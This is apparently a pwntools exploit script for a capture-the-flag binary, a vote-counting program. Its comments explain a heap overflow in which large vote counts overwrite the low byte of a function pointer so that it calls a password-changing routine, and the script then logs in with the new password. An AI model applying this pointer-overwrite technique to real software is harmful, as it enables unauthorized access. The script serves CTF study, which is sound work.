#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("challenge")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

io = start()

# This challenge is a heap overflow. By writing a number of votes that is too
# large we can alter the last byte of the pointer to vote_printer_selector
# which is on the heap as 0x0000555555555400
# if we use x/30i 0x0000555555555400 we see that
# 0x0000555555555439 is the starting address of change_password_to
# 0x39 is the equivalent of ascii '9'. So if we write 500000
# and then 500009 to the same person and then call print we will
# change the password to "Total"

io.recvuntil(b"> ")
io.sendline(b"1") # vote for candidates

io.recvuntil(b"> ")
io.sendline(b"1") # vote for first candidate

io.recvuntil(b"> ")
io.sendline(b"500000") # send 500000 votes

io.recvuntil(b"> ")
io.sendline(b"1") # vote for first candidate again

io.recvuntil(b"> ")
io.sendline(b"500009") # send 500009 votes

io.recvuntil(b"> ")
io.sendline(b"3") # return to main menu

io.recvuntil(b"> ")
io.sendline(b"2") # print votes to change password

io.recvuntil(b"> ")
io.sendline(b"3") # close the vote

io.recvuntil(b"> ")
io.sendline(b"Total") # send password

io.interactive()
